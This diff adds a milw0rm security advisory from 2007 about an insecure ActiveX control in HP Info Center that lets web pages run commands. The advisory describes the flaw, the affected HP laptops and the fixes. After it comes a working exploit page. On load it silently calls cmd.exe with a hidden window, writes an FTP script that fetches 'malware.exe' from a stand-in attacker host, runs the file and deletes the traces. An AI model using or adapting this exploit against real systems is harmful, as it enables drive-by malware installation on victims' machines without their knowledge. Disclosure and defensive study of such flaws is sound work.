@@ -1,0 +1,256 @@
+<!-
+Advisory:
+
+Multiple Hewlett-Packard notebook series are prone to a remote code execution attack.
+The manufacturer's preinstalled software contains a critical flaw within the software 
+built to support one-touch button quick feature access.
+
+Overview:
+/////////
+
+Software called "HP Info Center" is shipped with almost every HP laptop model for few years. 
+It is designed to support user with quick system information and hardware configuration
+using single button touch.
+One of its ActiveX controls deployed by default by the vendor has three insecure methods 
+that allow a malicious person to target the HP notebook machines for a remote code execution 
+and remote registry manipulation based attacks.
+
+Impact:
+///////
+
+Remote code execution
+Remote system registry read/write access
+Remote shell command execution
+
+Attack vectors:
+///////////////
+
+Architecture of the vulnerable HP Info Center software gives an attacker few different 
+attack vector combinations:
+
+- remote automated download and execute (e.g. malware instalation)
+- remote registry arbitrary key access (e.g. attack preparation, remote system info gathering)
+- remote registry data modification (e.g. sensitive data manipulation, malware instalation, DoS attacks)
+- system disk data area manipulation and user documents alteration (e.g. system files manipulation, 
+	sensitive user documents access, entire system crash DoS attacks)
+
+Any attack vector will always begin with a try to induce remote user owning a vulnerable machine to 
+launch the attackers controlled WWW link.
+If the victim uses diffrent browser than IE attacker will probably attempt to induce 
+to open the malicious webstite from within IE.
+After that the attack will follow automatic and without any need of interaction with 
+the victim.
+
+Technical analysis:
+///////////////////
+
+The vulnerable ActiveX control HPInfoDLL.dll is a component of HP Info Center application which
+is a part of HP Quick Launch Buttons software deployed by the manufacturer while a default
+HP machine OS installation.
+
+It has assigned following CLSID: 
+
+62DDEB79-15B2-41E3-8834-D3B80493887A 
+
+and is by default included to "Safe for Scripting" OLE components group, that allows full execution 
+scripting access to the control methods from within the browser.
+
+The default AX control installation path is 
+C:\Program Files\Hewlett-Packard\HP Info Center
+
+The control contains three potentially insecure methods:
+
+VARIANT GetRegValue(String sHKey, String sectionName, String keyName);
+void SetRegValue(String sHKey, String sSectionName, String sKeyName, String sValue);
+void LaunchApp(String appPath, String params, int cmdShow);
+
+The first and second method are used to access remote registry for read and write by the HP 
+update and configuration software. To access chosen registry key one must split its path 
+to 3 string parameters: 
+HKey parameter containing the main key handle string (for example "HKEY_LOCAL_MACHINE"),
+SectionName parameter which is double-slashed string path relative to the HKey, 
+and the last one - name of key to access / modify.
+
+The third method is used by the HP Info Center application to spawn utility programs from within
+the embeded IE window.
+When user presses one of the Quick Launch buttons on the HP keyboard the QLBCTRL.exe process 
+launches apropriate application, in this case: \HP INFO CENTER\hpinfocenter.exe, 
+an application build to support the user with quick wifi configuration, update check and so on.
+The application window contains enbeded IE control to launch the HPINFO ActiveX CTL.
+IE uses the JS script 'HPInfoCenter.js' located in the same dir, which is used to response 
+user input. When user selects the option he is intrested of, the JS code executes HPINFO 
+control's LaunchApp() method, which spawns the new process using JS code-specified path. 
+(e.g. Wireless Assistant, Help and Support Center, ...)
+The first problem is that the path variable passed as an argument to the LaunchApp() method 
+doesn't distinguish between global disk area and local HP software area.
+Therefore using this method, one is able to launch ANY executable binary within the system 
+within the logged user context.
+Combining this method with the system command shell one can execute any shell command sequence
+within the remote user context(e.g. format, del, copy ...) providing '/c' switch as a first parameter
+for the cmd.exe ("execute and exit" option).
+
+At this point, owning the shell commands execution access, CreateProcess() win32 Api function access
+and access to the system directory, we can construct an armed remote code execution exploit.
+All we need is to use the shell access to build remotely a batch file that after executed will 
+launch 'ftp.exe' Windows NT ftp client utility, download arbitrary remote file into local system 
+and execute it afterwards.
+Such an exploit however, would have a visible cmd shell window during the exploit driven 
+download process, so it would be easily noticeable and it would have been canceled by alerted user.
+
+However, thanks to the vendor's programmers, we have a direct mapping of the ShowWindow() 
+API function second parameter 'cmdShow' trough the LaunchApp() method interface.
+Passing here value 5 (SW_SHOW) will make the created process GDI window visible in its default shape.
+Passing however 0 value (SW_HIDE) will effect in a totally window-less process creation, that
+will continue its execution without main window rendered and without any app-icon on a taskbar.
+In short: using the HPInfo Activex control one can construct silent, windowless, 
+background running, remote execution exploit, which after spawned by clicking the 
+malicious website by user, will silently download arbitrary remote binary code and execute it afterwards, 
+even when user changes browsed website during exploit driven download or even close the browser 
+before the exploit completes.
+
+Vulnerable Software:
+////////////////////
+
+HP Info Center v1.0.1.1
+HPInfoDll.dll ActiveX CTL v1.0
+
+Internet Explorer 6.0  
+Internet Explorer 7.0  
+ 
+Windows XP Home
+Windows XP Pro
+Windows 2000
+Windows 2003
+Windows Vista
+
+Vulnerable Hardware:
+////////////////////
+
+Following laptop models, with all vendor's software and OS updates installed,
+has been confirmed to be vulnerable:
+
+HP 510 Notebook PC
+HP 530 Notebook PC
+
+HP Compaq 8710w  
+HP Compaq 8710p
+HP Compaq 8510w  
+HP Compaq 8510p
+
+HP Compaq 6910b
+HP Compaq 6715b
+HP Compaq 6510b
+
+HP Compaq 2710p
+HP Compaq 2510p
+
+HP Compaq NC series Business Notebook PC
+HP Compaq NC6230
+HP Compaq NC6220
+HP Compaq NC8230
+
+HP compaq NX series Business Notebook PC
+HP compaq NX7300 
+HP compaq NX6120 			
+HP compaq NX8220 
+HP compaq NX6325
+
+HP compaq NW series Mobile Workstation
+HP compaq NW9440
+HP compaq NW8440
+
+
+NOTE that listed models are ones that were quick-verified till now. Therefore full 
+and updated list of vulnerable machines/series should be released by the vendors 
+security response unit.
+
+Concerning Vista:
+/////////////////
+
+Few laptop models which are vista-ready can be bought with preinstalled vista at client's request.
+The owners of HP notebooks with HP Info Center software and preinstalled vista OS
+can sleep half safely.
+First good news is that the system will not allow to spawn an arbitrary new process 
+in fully automated way from within the LaunchApp() method of ActiveX control without the 
+interaction with user and will monit him before spawning any child process, whether to allow 
+to run the new process or not - that is the point where user shall say NO to stay safe.
+Second good news is that the SetRegKey() method will NOT gain the write access the the system registry
+within the vulnerable control context and registry write try will fail (note also, that because of 
+its architecture, the "harakiri" fix-exploit under vista WILL NOT patch the vulnerability)
+The bad news is that there is one attack vector which could exploit the vulnerability successfuly 
+under vista - remote system registry read attack.
+Although its final impact is relatively small, it can be used by malicious entity to maintain
+system structure information gathering and user sensitive data access (access to registry stored 
+passwords and hashes, software configuraion and versions, disk structure) and then to perform 
+final remote system attack.
+
+Solution:
+/////////
+
+- Wait for the apropriate software update from the vendor
+- Do not launch web site links from the untrusted sources
+- Install Non-Microsoft internet browser not allowing ActiveX (Firefox, Opera, Safari)
+- Manualy set kill-bit for a vulnerable ActiveX control
+- Launch the "harakiri" exploit listed on links section, which shuts the vulnerable control down 
+	using the vulnerability itself
+
+Unrelated final word:
+/////////////////////
+
+I think the company so deeply involved in security software patents war 
+should take a bigger care about the users security than
+taking profits from the rights to the invention of the circle.
+After all, what are the security software patents worth if it is the user 
+who has the final word about their own software security...
+
+Links:
+//////
+
+HPInfo vulnerability detection and fix-exploit site:
+www.anspi.pl/~porkythepig/hp-issue
+
+The advisory text link:
+www.anspi.pl/~porkythepig/hp-issue/kilokieubasy.txt
+
+Credits:
+////////
+
+Issue discovery and research: porkythepig
+Contact: porkythepig@anspi.pl
+-->
+
+<html>
+<head>
+<script language="JavaScript">
+
+
+var attackersFtpServerAddress="attacker.ftp.server";
+var attackersFtpUname="IDidntDoAnything";
+var attackersFtpPassword="password";
+var executableFileName="malware.exe";
+var cnt,p;
+
+function spawn2()
+{
+	o2obj.LaunchApp("c:\\windows\\system32\\cmd.exe","/C echo open "+attackersFtpServerAddress+
+		" >> c:\\ftpd&echo "+attackersFtpUname+">> c:\\ftpd&echo "+attackersFtpPassword+
+		">> c:\\ftpd&echo binary>> c:\\ftpd&echo get "+executableFileName+
+		"c:\\"+executableFileName+" >> c:\\ftpd&echo quit>> c:\\ftpd",0);
+	o2obj.LaunchApp("c:\\windows\\system32\\cmd.exe","/C echo cd c:\\>> c:\\ftpd.bat"+
+		"&echo ftp -s:ftpd>> c:\\ftpd.bat&echo start c:\\"+executableFileName+
+		" >> c:\\ftpd.bat",0);
+	o2obj.LaunchApp("c:\\windows\\system32\\cmd.exe","/C c:\\ftpd.bat&del "+
+		"c:\\ftpd.bat&del c:\\ftpd&del c:\\"+executableFileName,0);
+}
+
+</script>
+</head>
+
+<body onload="spawn2()">
+<object ID="o2obj" WIDTH=0 HEIGHT=0
+   classid="clsid:62DDEB79-15B2-41E3-8834-D3B80493887A"
+</object>
+</body>
+</html>
+
+# milw0rm.com [2007-12-11]
